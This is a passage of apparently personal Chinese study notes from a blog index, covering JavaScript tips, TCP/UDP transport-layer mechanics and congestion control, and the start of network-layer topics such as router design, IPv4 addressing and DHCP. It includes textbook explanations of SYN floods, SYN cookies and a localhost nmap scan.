b=2;[a,b] = [b,a]; 将对象作为参数传入函数，可选择性传递参数 123456function buildDate({year, month, day, hour=0, minute=0, second=0}) { return new Date(year + '-' + month + '-' + day + ' ' + hour + ':' + minute + ':' + second);}//使用buildDate({ year: 2017, month: 1, day: 1 });// Sun Jan 01 2017 00:00:00 GMT+0800 (CST) JS对象类型的坑这是廖雪峰老师总结的，抄在这里方便自己以后碰到这些问题而找不到头脑 不要使用new Number()、new Boolean()、new String()创建包装对象； 用parseInt()或parseFloat()来转换任意类型到number； 用String()来转换任意类型到string，或者直接调用某个对象的toString()方法； 通常不必把任意类型转换为boolean再判断，因为可以直接写if (myVar) {...}； typeof操作符可以判断出number、boolean、string、function和undefined； 判断Array要使用Array.isArray(arr)； 判断null请使用myVar === null； 判断某个全局变量是否存在用typeof window.myVar === 'undefined'； 函数内部判断某个变量是否存在用typeof myVar === 'undefined'。 数字的toString()方法需要特殊使用 123..toString() (123).toString() Number调用toString()方法产生的问题","link":"/Front-end/JavaScript/base.html"},{"title":"3.传输层","text":"本章详细的介绍了运输层的TCP和UDP协议 3.1-概述运输层服务运输层对不同主机之间的应用程序提供了逻辑通信（logic communication），类似将应用层连在了一起。 运输层协议实在端系统中实现的，运输层通过应用层接收到的报文转换为运输层分组，该分组被称为报文段（segment），然后交给网络层被封装成网络层分组（数据报） 向目的地发送。 3.1.1-运输层和网络层的关系网络层为主机之间提供逻辑通信，运输层为主机的应用程序提供逻辑通信。 3.1.2-运输层概述提供了两个协议： UDP（用户数据报协议）：提供不可靠的，无连接的服务 TCP（传输控制协议）：提供可靠的，面向连接的服务 当我们设计应用程序时，必须选择其中一个协议（才能生成套接字）。 为了理解这两个协议，先说一下网络层的IP，IP的服务是尽力而为交付服务（best-effort delivery service），它不保证报文段的交付、顺序交付及完整性，所以被称为不可靠服务（unreliable service），每个主机都有一个IP地址。 而UDP和TCP则是将两个端系统的IP对话服务扩展到进程之间的对话。 3.2多路复用和多路分解 当运输层报文到达运输层时，运输层检查这些字段，得到套接字（唯一标识的），然后将数据传给这个套接字，这些工作被称为多路分解（demultiplexing）。 在源主机收集数据块封装首部信息，生成报文段传给网络层，这些工作被称为多路复用（multipexing）。 所以多路复用要求： 套接字有唯一标识符 有特殊字段来指示对话的套接字（如源端口和目标端口） 注意0-1023端口是比较特殊的，如80给了HTTP，25给了SMTP…详细请看RFC1700 1.无连接的多路复用和多路分解使用python创建一个UDP套接字来分析 1clientSocket = socket(socket.AF_INET,socket.SOCK_DFRAM) 这种方式创建的socket在运输层会自动被分配一个1024-65535的端口，并且该端口未被主机使用，也可以使用bind()方法指定端口 1clientSocket.bind(('',9001)) 如果是设计知名协议（http、smtp）的服务端，那就要使用这个协议指定的端口。 复用和分解 假设A主机有一个进程额UDP端口是10000，发送给B主机UDP端口为20000的进程，那么主机A的运输层首先创建一个运输层报文，包括数据，源端口，目标端口，传递给网络层，网络层封装到IP数据报中，向B主机发送。 到达B时，B的运输层检查目标端口，然后把数据交给该端口对应的套接字（定向分解） 注意事项 UDP套接字是一个二元组，包含了一个IP和端口，比如上面bind方法里面的参数 1('',9001)# 第一个参数是IP，当为空时代表本机 源端口的作用，是服务端返回数据时用的 2.面向连接的复用和分解TCP套接字使用了四元组(src_IP,src_prot,dst_IP,dst_port)标识，目标主机会使用四个值分解到相应的套接字。 使用python代码演示一下TCP TCP客户端创建套接字并连接上服务端 12clientSocket = socket(AF_INET, SOCK_STREAM)clientSocket.connect((serverName,serverPort)) 当服务端接收到请求后，定位服务器进程，然后建立一个新的套接字 1connectionSocket, addr = serverSocket.accept() 此时服务端会注意连接请求报文的4个值，如果后续到达的报文段4个值与连接的4个值相等，则将数据分解到新建立的套接字上。这就算建立连接完成了。 前面说的持续HTTP就是使用同一个套接字传输数据，非持续就是不断产生新的套接字，这是比较浪费服务端性能的 端口的安全性 端口对于破坏者来说相当于突破口，如果该端口上的应用程序有缺陷，则破坏者就能在攻击的主机上执行任意代码，导致主机被攻陷。 3.3-UDPUDP被称为是无连接的，因为发送方与接收方的运输层实体之间没有握手。 DNS通常就使用了UDP，因为TCP需要握手，如果使用TCP的话，DNS查询会慢很多，而UDP不需任何准备就可以传输数据 TCP是可靠的传输协议，那我们什么时候使用UDP呢。下面是比较适合使用UDP的几点 希望随时发送数据，可以容忍一点数据丢失，TCP有一个拥塞控制机制，当链路拥挤时会阻塞运输层的发送 不想建立连接，连接也是有往返时延的，如DNS使用UDP 分组首部占用小，UDP报文端有8字节的首部，TCP有20字节 因为UDP没有拥塞处理，所以会有较高的丢包率 3.3.1-UDP报文段结构应用层数据占用UDP的数据字段。UDP首部有4个字段，每个占2字节；除了源端口和目的端口，还有Length和校验和，Length表示报文段的字节数（首部+数据） 3.3.2-UDP校验和为了确保数据在发送过程中不会出错，发送方的UDP会对报文中的所有16bit字节进行相加（溢出部分不管）再取反，将结果放在校验和字段，接收方将所有16bit全相加，如果结果不是1111 1111 1111 1111则代表出了差错 更多计算细节参考https://segmentfault.com/a/1190000008543293 其实数据链路层也有差错控制，为什么UDP还需要呢？主要是因为不能保证源和目的之间所有链路都有差错控制，其次就是当报文传递到内存中也可能出现差错。 UDP也是可以进行可靠传输的，但这需要应用层开发人员建立一些机制，并大量调试 3.4-可靠数据传输原理这章使用术语‘分组’，只考虑单向传输 3.4.1-从0构造一个可靠数据传输协议书中从研究最简单的协议进行深入得到一个无错的、可靠的协议 可靠传输rdt1.0在这个协议中，设定底层信道是完全可靠的。 下图是发送和接收方的有限状态机FSM（Finite-State Machine），FSM简单来说就是描述某一时刻的状态和转换状态字符 蓝色箭头代表状态的改变，这里的FSM只有一个状态。横线上方是事件，下方是动作。 假设发送速率和接收速率一样，又有完全可靠的信道，所以不用担心差错问题，和发送速率问题。 rdt2.0这个协议考虑到了信道的差错。 类比人类，如果小明对小红说话，而小红没听清，于是叫小明再说一遍。 在rdt2.0里使用了自动重传请求ARQ（Automatic Repeat reQuest） 差错检测 接收方反馈：确认（ACK）和否定确认（NAK） 重传 发送端比1.0增加了一个状态–等待接收方回答，由于发送端发送数据后就进入了等待状态，所以这种协议叫停等（stop and wait）协议。 而接收方就准备接收和回答。 这个模型的缺点就是当回答出现差错时，发送方就不知道接收方是否正确的接收到了数据 解放方法（书上还有重述和纠错，但介绍模型只有下面两个） 添加冗余ACK，出错就重传当前分组，缺点是不知道分组是最新的还是重传的 传输协议在数据分组中添加一个新字段，然后对数据分组编号，将序号放在这个字段。所以接收方会检查序号来选择是否重传。 对于停等协议，这个字段采用1bit记录。接收方根据最近的分组序号是否相同可以知道重传的分组，根据不同可以知道新分组。 rdt2.1从上面的方法改进rdt2.0，这里假设信道不会丢失分组，而ACK和NAK也不用回答序号，因为我们知道是响应最近的分组 Λ代表无事件或动作 发送方依旧通过NAK和ACK接收回答，但如果接收到同一分组的两个ACK，就说明后面的分组没有收到。 rdt2.2展示了一个有比特差错信道上实现的无NAK的可靠传输协议 接收方与2.1的区别就是回答增加了分组序号，发送方需要检查这个序号来选择重传和发送下一个分组。 rdt3.0前面考虑的都是bit差错，而网络上丢包屡见不鲜（比如你如果在大陆ping我的网址，绝对丢包，因为我的网站部署在github上，大陆在github的访问速度一言难尽），如果丢包，需要解决两个问题：1.如何检测丢包。2.如何处理丢包。第二个问题rdt2.2已经解决了，为了解决第一个问题，需要增加一个协议。 而判定一个数据包丢失的因素，最好的就是时间超时，发送方可以每发送数据分组时启动一个计时器，在规定时间过期后就可以重传。 上面就是rdt3.0的发送方，运行大致步骤： 发送分组0，启动计时器 接收回应，如果分组出了差错，等待超时 超时后，重传，启动新的计时器 分组正确被接收，停止计时器 当ACK因超时到达时，do nothing 发送分组1…. 下图就是当ACK超时到达时的运行情况 因为序号在0与1之间转换，所以rdt3.0也叫比特交替协议（alternating-bit protocol） 3.4.2-流水线可靠数据传输协议停等协议有着很大的性能缺点，在1Gbps的链路，当往返传播时延（RTT）比较大时（几十毫秒），信道利用率只有万分之几（发送方传输时间与接收时间+RTT的比值），也就是说即便是1Gbps的链路，也只能达到kbps级别的吞吐量。这充分体现了网络协议可以限制硬件能力。 所以，有了流水线协议，它的特点就是一次发送多个分组，分组利用率就提高多少倍。 为了保证流水线协议的可靠性，必须保证以下几点 增加序号范围 增加缓存 处理分组丢失、损坏、延时过大等问题：如回退N，选择重传。 3.4.3-回退N步GBN（Go-Back-N）允许发送多个分组，N代表未确认的分组不能超过N. base代表已经发送等待回应的最初序号，nextseqnum代表下一个准备发送的序号，整体随着协议的运行有点像一个滑动的窗口，所有N被称为窗口长度，GBN也叫滑动窗口协议。 分组的序号是在首部的固定字段中，范围与所占bit有关。 下图就是GBN的发送方和接收方的FSM，包括了一些编程语言的特性–变量。 发送方 当窗口未满时，允许上层调用rdt_send()，发送n（将窗口填满）个分组并启动一个计时器 接收ACK，因为接收方对ACK的要求，发送方接收到n序号的ACK，则代表n以前的分组已经顺利交付 超时事件，如果某个分组丢失或者超时，就会重传没有被确认的分组 接收方 如果是按序号到达的，则发送这个序号的ACK，并交付给上层 如果不是，则丢弃，并发送最近序号的ACK 我总结了GBN的特点 如果不是按序到达，则后面的分组会被接收方丢弃，由发送方重传 如果接收方前面所有的ACK丢失，哪怕最后只有一个ACK，发送方也会知道分组完好到达接收方 3.4.4-选择重传SRGBN的缺点很明显，也是一个性能问题，当中间某个分组丢失，则后面的所有分组也会被丢弃。 选择重传就是将不按顺序到达的分组缓存并发送ACK，等前面分组齐了就交付。 发送方 从上层接收数据，如果序号在窗口内，则打包数据发送，否则不进行传输 超时，现在每个分组都有一个逻辑计时器，某个超时就发送某个分组 接收ACK，若ACK序号在窗口内，则标记该序号为已接受，如果==base，则窗口向前滑动 接收方 接收分组序号在窗口内，若前面有空的序号，则该分组缓存，并发送ACK；若该序号与后面的序号连续，则交付这串连续的分组，发送ACK，并滑动窗口 接收到以前确认的分组（不在窗口内），发送ACK 否则忽略掉 注意：SR的窗口长度必须&lt;=序号空间（包括0），否则会因为不同步的问题难以区分新旧分组 总结 机制 用途 校验和 检测分组的bit错误 定时器 检测超时、丢包 序号 接收方判定重传的是副本还是新的 ACK 接收方告诉发送方”收到” NAK 和上面相反 窗口，流水线 窗口利用率低，流水线要好得多 3.5-TCPTCP连接是带有状态的，初次连接会初始化这些状态变量。 TCP是全双工服务（full-duplex service），指的是点对点的交换数据，即一对主机。 建立一条TCP连接：客户先发送一个特殊的TCP报文段，服务接收后用另一条特殊的TCP报文段回应，客户发送第3段报文（含有上层数据），这种过程称为三次握手。 建立连接后双方可以互相发送数据了，数据向从套接字出发后，就交由TCP控制，TCP会先将数据放入缓存，时机一到就发送。从缓存取出封装发送的报文段受最大报文段长度MSS（Maximum Segment Size）影响，MSS由最大传输单元（链路层）MTU（Maximum Transmission Unit）设置。一般MTU都是1500字节，MSS都是1460字节，因为IP+TCP首部有40字节。 MSS指的是报文段里的数据长度，不包括TCP首部 官方TCP缓存示例 TCP的报文段结构 从上到下，左到右的简述 与UDP一样，开头是源端口和目的端口，每个16bit 第二和第三行是序号字段（Seq）和确认（ACK）字段，这是实现可靠数据传输的重要部分 4bit的代表首部长度字段，单位是32bit，可以代表0-60byte(15x32/8)。通常TCP是20字节，可选字段会影响这个长度 4bit未使用 8bit的标志字段，ACK标识上面的ACK字段是否有效，RST、SYN、FIN表示连接、建立、拆除；PSH代表接收方需要马上上交数据，URG代表存在紧急数据。 16bit的接收窗口字段 序号和确认将数据流拆分成报文段，序号有利于将这些报文段正确重组成数据，即使他们无序到达。接收方发送的ACK里面是它期望的下一个报文段。（序号使用字节流编号） 假设1号到达，3号到达，而2号还在路上，此时1号期望2号，而3号也一样期望2号。这叫累计确认（cumulative ACK）。 对于提前到达的3号，RFC不提供规则，处理方法由开发者决定，要么丢弃，要么缓存。 实际上，防止旧连接的报文段与现有报文段冲突，初始序号都是随机的 我使用一段对话来帮助理解： A表示客户，随机序号10，B表示服务端，随机序号20 A:’你好，我是10号（Seq），携带5字节的数据，我期待20号（ACK）’ B:’收到，我是20号，携带100字节，期望15（10+5）号’ A:’收到，我是15号，我期望120号的数据….’ …….. 接下来是一些关于估计往返时间（RTT）和设置重传时间间隔，有点看不懂，跳了 TCP可靠传输为每个没有ACK的报文段使用计时器，不容易管理。采用的简单模型如下 发送方三个事件 接收上层数据：创建TCP报文段，如果当前无计时器则启动一个计时器，传递给IP封装发送 超时：发现计时器超时，重启，并发送超时的最小的序号段 接收ACK：将ACK序号与当前序号对比，如果大于，则当前序号=ACK序号；当前还有未确认的报文段，重启计时器 因为采用累计确认，所以ACK序号前面的字节都代表完好无损的到达了 需要注意的一点就是在传输数据时，如果第一个事件和第三个事件都没发生，超时每次重启的时间间隔都会是以前的两倍，这是为了缓解网络拥塞 这种重传机制也会增大时延，接受方也采用了一定的策略来解决这种不必要的时延 事件 接受方动作 当期望序号按序到达，且前面的序号都已确认 延时发送ACK，通常是500ms 当期望序号按序到达，而前面还在延时发送ACK 立即发送ACK，确认了两个序号 当报文段失序到达 发送最小确认序号的下一个期望序号ACK 填充失序的中间序号到达 若是最小序号所期望的，则立即发送ACK 而发送方接受ACK的动作增加了一项 连续接受到3个一样的ACK，则立刻重传丢失的报文段 流量控制缓存毕竟有限，如果发送方不顾接受方是否愿意，强塞怎么办，那必然会导致接收方缓存溢出，而TCP报文段的接收窗口（receive window）字段可以控制发送方的发送速度，这就是TCP的流量控制服务。 请注意流量控制和拥塞控制之间的区别 TCP接收方的变量关系 最后一个从缓存读取的字节编号-最后接收进缓存的字节编号&lt;=接收缓存 接收方需要发送的接收窗口大小就是上面两个编号的差。 TCP发送方的变量关系 最后发送的字节编号-最后一次接收的ACK编号&lt;=接收窗口 注意：当接收方回应接收窗口为0时，发送方接收后还需要回应一字节的报文被接收方确认，当接收方缓存有空余时，确认报文的接收窗口不为0。 TCP连接管理建立TCP连接：三次握手（three-way handshake） 客户端建立一个特殊的报文，将SYN同步序列编号（Synchronize Sequence Numbers）标志位设置为1，随机取得初始序号client_isn，然后发送 服务器收到后，响应SYN对该TCP分配缓存和变量，然后设置个SYN为1，ACK为client_isn+1，并取得随机序列号server_isn，然后发送SYNACK（如果一分钟之后没有回应，则关闭连接） 客户收到后，分配缓存和变量，然后设置SYN为0，ACK为server_isn+1，代表连接成功，然后发送带客户数据的报文段给服务器 断开连接 客户将发送一个将FIN标志为1的报文段，进入FIN_WAIT_1 服务器收到，然后回应ACK，客户收到进入FIN_WAIT_2 过一会，服务器发送FIN为1的报文段 客户端回应ACK，并进入TIME_WAIT状态，等待30s释放端口等资源 客户端经典的TCP状态图 连接第三步后处于ESTABLISHED状态，可以发送有效数据 服务端经典TCP状态图 上图的服务端在监听，如果没有监听呢？服务会发送一个将RST标志为1的回应给客户端，含义是”套接字不存在，别发了”。 SYN flood attack 在三次握手中，第二步接到SYN分配缓存和变量，然后等待回应，一个针对这个漏洞的DoS攻击叫SYN洪泛攻击。 通过发送大量TCP SYN报文段导致服务器资源耗尽。 有个解决方案就是SYN cookie，在进行第二步时不分配资源；接收到SYN时，将客户IP，端口，和服务器的秘密数使用特殊函数生成一个初始序号发送SYNACK（不保存任何信息）；当接收到回应时，将ACK和IP、端口，和服务器的秘密数生成的结果+1==它的ACK，则代表合法 nmap端口扫描器可以得到任何服务器开放的端口，比如获取本机开放的端口 123456789101112131415161718192021╰─ sudo nmap localhost -OStarting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 23:02 CSTNmap scan report for localhost (127.0.0.1)Host is up (0.000031s latency).Other addresses for localhost (not scanned): ::1rDNS record for 127.0.0.1: Mydev.localdomainNot shown: 995 closed portsPORT STATE SERVICE22/tcp open ssh23/tcp open telnet25/tcp open smtp587/tcp open submission631/tcp open ippDevice type: general purposeRunning: Linux 2.6.XOS CPE: cpe:/o:linux:linux_kernel:2.6.32OS details: Linux 2.6.32Network Distance: 0 hopsOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds 原理 对目标主机的端口发送TCP SYN，得到输出 如果是TCP SYNACK，代表该端口打开 如果是TCP RST，代表端口没打开，同时也代表没有防火墙 什么也没有，代表有防火墙 nmap还可以得到UDP的端口，侦测防火墙，操作系统 3.6-拥塞控制重传意味着分组丢失，间接代表网络拥塞。 控制方法 端到端拥塞控制：端系统通过关注时延和丢包来控制发送速率 网络辅助控制 路由器直接反馈发送方它的状态 接收方反馈网络状态 TCP拥塞控制TCP采用的是端到端的拥塞控制，IP不会反馈网络拥塞。 发送端维护着一个变量叫拥塞窗口（congestion window），cwnd限制了发送端的发送速率。$$LastByteSent-LastByteAcked&lt;=min(cwnd,rwnd)$$如果TCP觉得网络拥塞了，就会自动降低cwnd，网络通畅，增加cwnd。而TCP控制cwnd的原则有以下几点 报文段丢失，降低cwnd 丢包 得到4个一样的ACK 报文段正确到达，增加cwnd 拥塞控制算法如何伸缩cwnd的细节 1.慢启动（slow-start) cwnd初始值设置为MSS，得到ACK，则设置成2MSS，后面对每个ACK都会增加一个MSS，cwnd呈指数形式增长。 如果出现丢包，将变量ssthresh（慢启动阈值）设置为cwnd/2，cwnd设置为1MSS，继续上一步 当cwnd&gt;=ssthresh时，结束慢启动转为拥塞避免状态 如果检测3个一样的ACK，则执行快速重传并进入快速回复状态 为了更高的响应速度，云服务器会采用TCP分岔技术 2.拥塞避免 每次RTT会让cwnd增加一个MSS，假设cwnd是MSS的十倍，则发送10报文，每个ACK会增加1/10的MSS（线性增长） 出现超时丢包，cwnd设为1，更新ssthresh为cwnd/2，进入慢启动 出现3个一样的ACK，ssthresh设为cwnd/2，cwnd设为ssthresh+3MSS，进入快速回复状态 3.快速回复 每得到丢失报文段的ACK，cwnd会增加一个MSS，然后进入拥塞避免状态 如果丢包，ssthresh设cwnd/2，cwnd设置为1MSS，进入慢启动状态 关于上面3个状态的FSM 4.总结如果是3次ACK的丢包事件，TCP的拥塞控制：每个RTT类线性增加1MSS，3次ACK将cwnd减半，因此TCP也叫AIMD（Additive-Increase,Multiplicative-Decrease）拥塞控制方式 5.TCP吞吐量将丢包时的cwnd表示为W，对于一个稳定的精简的模型$$平均吞吐量=（0.75{\\times}W）/RTT$$如果丢包率为L$$平均吞吐量=\\frac{1.22{\\times}MSS}{RTT\\surd{L}}$$ 6.TCP和UDP的公平性分析过程就不记笔记了，只记结果 用过拥塞窗口可以看到TCP是比较公平的，会根据拥塞程度适当调整速率，而UDP则是什么都不管，发送就直接发送，可以说UDP会压制链路上TCP的速率 书上说还是没有好的解决方案，而且就算UDP公平了，TCP的并行连接也是不公平的，他会分到更多的传输速率 3.7-显示拥塞通知(ECN)Explicit Congestion Notification允许TCP发送方和接收方直接发送拥塞信号。 ECN在IP数据报头会有特殊设置位，路由器会根据拥塞情况改变该设置位，当接收主机收到拥塞指示时，将TCP首部标志位ECE(Explicit Congestion Notification Echo)打开，发送方接到该信息就会做出反映，然后在下一个报头设置CWR((Congestion Window Reduced)。 第三章总结首先就是介绍运输层为应用层提供的服务，如UDP是一个很简单的协议，提供的服务也很简单，只传输，不可靠。而TCP提供了数据可靠交付，时延保证，带宽保证。 因为网络层是不可靠的，有从0开始完成一个在不可靠的层上面完成一个可靠的传输（ACK，重传，定时器等） 然后学习了TCP的连接管理、流量控制、可靠数据，研究了最初的TCP和升级TCP，以及它的拥塞控制 可以看到这两个协议还是不完美，新建立的标准的协议有DCCP、SCTP、TFRC等等，应用层度还有待取证 后记一些数据分析对于我来说还是难点，希望自己学完高数后重温这些分析。","link":"/Networking/Top-Down-Note/3.%E4%BC%A0%E8%BE%93%E5%B1%82.html"},{"title":"4.网络层-数据平面","text":"网络层分两部分讲解，数据平面和控制平面(区分这两个概念很重要)，该章主要讲解了数据报输入输出链路的选择、IP转发、通用转发、IPv4和IPv6. 理清楚术语有利于学习本章: 数据包和分组是同一概念, 都是packet翻译过来的. 数据报和数据包有点类似, 比如UDP数据报, IP数据报, TCP数据包, UDP数据包, IP数据包.. 4.1-Overview路由器的数据平面将数据报从输入链路转发到输出链路，网络控制平面主要控制着数据报进行端到端传输。 4.1.1-转发和路由-数据和控制平面将数据发送至目标主机，有两个重要的网络层功能。 转发：数据包在单一路由器里从输入到选择合适的输出链路（几纳秒），对应数据平面 路由：网络层必须在所有路由器中确定数据包采用的路由或路径（几秒），相关算法称为路由算法，对应控制平面 路由器的关键是转发表，路由器会检查每个数据包首部字段，查询转发表以确定输出链路。 控制平面的传统方法 每个路由器都有一个可以和其他路由器通信的路由组件，路由器之间通过通信计算转发表的值 控制平面的SDN方法 (software-defined networking, SDN)将控制平面提升到了远程控制，通过远程控制器来分配转发表的值。 4.1.2-网络服务模型网络服务模型定义了发送方与接收方之间数据包的传递特性. 网络层能提供的部分服务: 保证交付数据: 确保源数据包可以到达目的主机. 此外还可以指定时延范围进行传递 有序的数据包: 保证数据包按照发送顺序到达目的主机. *保证最小带宽: 在指定的链路速率下, 只要发送速率低于链路速率, 那么所有数据包都会到达目的主机. 安全性: 在源主机进行加密, 目的主机进行解密即可保证安全性. 但是Internet网络层提供的是尽力而为服务, 不保证到达-延迟-带宽, 虽然有其他模型满足上述服务, 但事实证明了尽力而为服务和现下非常契合. 注意: 有两种类型交换机, 针对网络层的叫数据包交换机, 转发策略根据数据包头的信息决定, 通俗来说把数据包交换机叫路由器; 针对链路层的交换机是链路层设备. 4.2-路由器组成和作用路由器架构如图 输入端口 这个端口不是TCP套接字的端口, 而是代表物理端口(或者说接口更合适), 图中三个方框分别代表物理层, 链路层, 网络层. 功能: 1. 物理链路与物理层的交互. 2. 链路层的交互. 3. 网络层, 查询转发表将数据包通过交换结构转发到输出接口. 交换结构 将输入端口连接到输出端口, 它完全包含在路由器中, 是一个网络路由器中的网络. *输出端口 存储从交换结构得到的数据包, 通过执行链路层和物理层的功能后在传输链路上进行传输(也可以取消). 如果链路是双向传输, 则输入和输出端口在印刷电路上有特殊的结构 路由处理器 执行的是控制平面的功能. 在传统的路由器中, 执行路由器协议, 维护路由表和链路状态信息, 并计算转发表. 在SDN的路由器中, 它负责和远程控制器通信, 为路由器计算转发表 各个部分都使用了物理硬件来实现, 因为数据到达通常是ns级的, 对于软件来说太快了 4.2.1-输入端口细节输入端口通过转发表来找输出端口, 而转发表则由路由处理器计算或者从SDN接受. 转发表通过一条总线复制到每个端口, 避免了集中处理. 在32位的IP地址中, 转发表如果为每一个可能的地址都分配了一个条目, 而地址可能有40多亿, 这不大现实. 一般来说, 会在某段地址范围之间选择一个链接接口. 也会采用前缀的形式进行选择, 如下 IP前缀 转发链路接口 11001000 0010 0 11001000 00100011 1 11001000 011 2 其他 3 如果匹配多项, 则会挑前缀最长的那项, 越长越精确 cisco catalyst 6500, 7600系列有一百万个TCAM转发表条目 为了更快的(ns)在转发表中查找, 一般选择使用SRAM和TCAM存储器. 确定输出端口后, 就将数据包发给交换结构(牵扯到排队拥塞调度), 查找是输入端口中最重要的一个功能, 除此之外还有 进行物理与链路层处理 检查数据包的版本号, 校验, 生存时间 更新网络管理的计数器 4.2.2-交换结构(switching fabric)细节是路由器的核心, 有多种数据包交换(指从输入端口到输出端口)方式 通过内存转发. 输入输出相当于操作系统的IO, CPU(路由处理器)从数据包首部取出目的地址, 在转发表中找到输出端口后, 就将数据包复制到输出端口的缓冲区.(即使有不同的输出端口, 但因为是共享系统总线, 一次只能进行一次读写, 区别线路卡) 许多路由器都使用内存交换技术。然而，目的地址的查找和将分组存储(交换)进适当的存储位置是由输入线路卡上的处理器来执行的。 通过总线转发. 输入端口通过共享总线将数据包直接转送到输出端口, 不需要路由处理器. 虽然CPU没有涉及总线传送, 但因为总线共享, 还是只能一次传送一个数据包. 当数据包到达输入端口, 如果发现总线在忙, 他就会被阻塞(数据包进入内存需要通过总线). 通过互连网转发. 使用互连网络, 可以克服共享总线带宽的限制, 当不同输入端口转发到不同输出端口时, 能够并行转发 4.2.3-排队将输入链路速率和输出速率相等设为R, 交换结构处理速率设为L R&lt;&lt;L 不存在输入排队, 存在输出排队 R&gt;L 存在输入排队, 并且存在HOL(Head of the line)阻塞, 即排队第一个数据包被阻塞, 后面的数据包也会被影响 4.2.4-数据包调度如何处理排队, 这就是调度 1.FIFO(FCFS)先进先出(先到先服务)指的是按照到达顺序将队列数据包进行链路传输, 先到的先被处理 2.优先级到达的数据包会进行分类, 高优先级队列的会比低优先级队列的先被传输, 优先级相同的数据包采用FIFO处理 3.轮循(RR)和加权公平排队(WFQ)轮循就是循环不同的队列来发送数据包. WFQ与RR有点像, 但它为每一个队列进行加权, 避免优先级低的得不到服务, 还有就是采用轮循, 当队列为空时, 立刻切换到下一个队列 4.3-IPv4, IPv6IPv4数据报格式对于网络, IP可以说是最为重要的一部分了(寻址, 转发), 下图就是IPv4报头的组成部分 version: 占4bit, IP协议的版本号, 路由器根据不同的版本来解析IP数据报头 Headerlength: 4bits, 代表IP头的长度, 用来确定有效载荷, 典型的IP头是20字节(不包含该选项) Type of service: 8bits, 服务类型用来区分不同类型的数据报(设置优先级), 如IP电话和FTP的数据报 Datagram length: 16bits, 代表IP数据报的总长度(IP头+数据), 单位字节(因为以太网帧的原因通常不超过1500字节) Identifier(16bit),Flags(3bit),Fragmentation(13bit) offset: 标识符, 标志, 碎片偏移与IP分片有关.(IPv6没有分片) Time to live(8bit): TTL表示生存时间, 每经路由处理, 这个字段都要-1, 到达0时则丢弃该数据, 防止在网络中一直流通 Upper-layer protocol(8bit): 指定传递的上层协议, 如6表示TCP, 17表示UDP, 参见IANA. 类似传输层的端口, 将传输层与应用层粘合, 协议号将网络层与传输层粘合 Header checksum(16bit): 标头校验和, 它只校验IP首部, 错误就丢弃, 这里要区分TCP/UCP的校验和, 它们是在整个段计算校验的. 源IP和目标IP: 源主机从DNS获取目标IP, 插入目标IP字段 options: 选项是对IP头的扩展, 出去性能考虑一般不怎么使用, IPv6没有该字段 Data(有效负载): 如TCP段内容 没有选项字段的IP头有20字节 IP数据包分段链路层协议支持发送规定范围内的数据包, 如以太网帧可以容纳1500byte, 链路层MTU(maximum transmission unit, 最大传输单位)限制了链路层帧的最大容量, IP数据包会被封装在链路层帧中, 所以MTU会对IP数据包的长度限制. 但是不同的路由器可能有不同的链路层协议, 有着不同的MTU. 当一个路由器的下一个路由器的MTU&lt;该路由的IP数据包长度, 这怎么办? 方法是将IP数据包再次拆分, 然后单独封装. 小的数据包称之为fragment(片段). 片段需要组装才能到达目的地的传输层, 为了保证路由器的性能, 将重组的工作交给了终端系统. 源主机会在数据包中标记源-目的地址和标示号, 每个数据包(分片)都有, 目的通过检查标识号来知道该数据包是否是某个大数据包的片段. 由于IP不可靠, 会丢失片段, 需要使用偏移量来确定该片段的顺序, 使用标志位来确定最后一个数据包(0标识) IP寻址IPv4长度32位, 约有43亿个IPv4地址, 通常表示为十进制, 每字节使用.隔开, 如192.168.1.1 主机和路由如何链接互联网? 主机网络接口连接一条网络链路, 通过该链路发送信息. 路由器也有接口, 但它需要在一个链接上接受, 在另一个链接上传输, 需要两个及以上的连接, 所以路由有多个接口. 每个接口都需要发送/接受数据, IP协议要求每个接口都需要有自己的IP. 所以IP与接口关联, 不与机器关联. 全局Internet中每个主机和路由器上的每个接口必须具有全局唯一的IP地址(后面会说NAT), 接口IP地址由他的子网决定 说一下192.168.1.0/24表示法: 也叫子网掩码, 代表前24位定义了子网地址 子网: 将每个接口与主机和路由断开, 连续的线路就是一个子网 子网里面的所有设备都具有相同的子网地址 无类别域间路由Classless Interdomain Routing (CIDR)规定了子网寻址的概念, 它将IP地址分为两部分, a.b.c.d/x, a-d是十进制的IP地址, x是最高有效位, 构成IP地址的网络部分, 称为网络前缀. 通常为某个组织分配一个前缀, 然后该组织的所有设备都共享这个前缀. 32-x位可以区分组织内的设备, 32-x也可以有组织内的子网 前缀能减少路由器转发表的大小, a.b.c.d/x的形式足以将数据包转发到任何目的地 使用单个前缀告知自己有多个网络的能力叫路由聚合 在使用CIDR之前, IP的网络部分被设置为8bit, 16bit, 24bit长度, 分别叫做A, B, C类网络, C类只能有$2^8-2=254$个IP地址(2个IP有其他作用), 而B类能有$2^{16}-2=65534$的IP地址. 假设某组织需要分配300个IP地址, 只能为其分配B类的子网地址, 空余65000个IP地址, 浪费了太多空间, 而且B类网络地址也会很快耗尽. 当主机的发送目标为IP广播地址255.255.255.255时, 该数据包会发送给子网内的所有主机, 路由器一般不会转发 ICANN非盈利性组织负责分配IP和管理DNS根服务器等工作 DHCP当组织获取到IP地址块后, 可以手动将IP分配给路由器和主机, 也可以通过DHCP(Dynamic Host Configuration Protocol,动态主机配置协议)自动配置(可以固定IP或者临时IP), 主机通过DHCP还可以获得子网掩码, 默认网关(第一跳路由器地址), 本地DNS服务器地址等. DHCP是基于CS的协议, 每个子网都至少有一个DHCP服务器, 或者知道DHCP服务器地址的DHCP的代理(路由器) 连上网络的主机想在DHCP协议下获取IP分为四步, 如图所示(yiaddr代表you internet address): DCHP discover: 为了找到DHCP服务器, 客服端会使用UDP数据包发送DCHP discover消息, DHCP服务端使用67端口, 客户端使用68接口, 由于没有IP, 客服端会以广播IP地址255.255.255.255和自身IP地址0.0.0.0建立IP数据报传递到链路层, 链路层会广播到子网内所有的节点. DCHP offer: 服务端接受到信息后进行响应, 图中使用广播地址, 书中理由是因为可能有多个DHCP服务器, 广播可以让客户端选择合适的地址. 但我并不信服这个理由, 就算是单播也能让客户端进行选择啊. 上网查了下, 可以在DHCP Discovery / Request报文里设置BROADCAST flag = 0来代表单播. 抓包得到Bootp flags: 0x0000 (Unicast)表示单播 响应的消息会带有唯一会话ID, 建议的IP地址, 网络掩码, IP使用时间 为什么要分为单播和广播? 单播: 点对点, 不影响其他主机 广播: 点对所有点, 会影响到子网内其他主机 如果协议栈在初始化中不支持单播, 则使用广播 如果支持则使用单播 DHCP request: 